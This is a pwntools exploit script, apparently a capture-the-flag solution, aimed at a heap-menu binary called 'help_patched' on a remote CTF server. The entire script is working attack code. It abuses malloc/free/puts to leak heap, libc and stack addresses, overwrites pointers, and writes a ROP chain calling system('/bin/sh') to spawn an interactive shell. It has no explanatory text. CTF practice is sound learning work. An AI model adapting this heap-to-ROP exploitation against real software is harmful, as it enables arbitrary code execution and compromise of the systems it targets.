from pwn import *
from icecream import ic

elf = exe = ELF("./help_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("ctf.csd.lol", 7777)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def malloc():
    sl('malloc')

def free():
    sl('free')

def scanf(data):
    sl('scanf')
    sl(data)

def puts():
    sl('puts')

ru("exit\n")
malloc()
free()
malloc()
puts()
leak = uu64(5) << 12

ic(hex(leak))

scanf(b'/bin/sh\x00')
for i in range(17):
    malloc()
if args.REMOTE:
    leak -= 0x2000
    leak += 0x1318
else:
    leak -= 0x1000
    leak += 0x718
sl(b'aaaaaaaa' + p64(leak))

puts()
ru("invalid command\n")
libc.address = uu64(6) - 0x2044e0
ic(hex(libc.address))
pause()


sl(b'aaaaaaaa' + p64(libc.address + 0x204370 + 0x370))

puts()
ru("invalid command\n")
stack_addr = uu64(6) - 0x2d0


ic(hex(stack_addr))
sl(b'aaaaaaaa' + p64(stack_addr+16))
pause()

scanf(p64(qgad(libc, 'rdi')))
sl(b'aaaaaaaa' + p64(stack_addr+24))
scanf(p64(binsh(libc)))
sl(b'aaaaaaaa' + p64(stack_addr+32))
scanf(p64(gad(libc, ['ret'])))
sl(b'aaaaaaaa' + p64(stack_addr+40))
scanf(p64(libc.sym['system']))
sl(b'aaaaaaaa' + p64(stack_addr))
scanf(p64(qgad(libc, 'rdi')))

io.interactive()
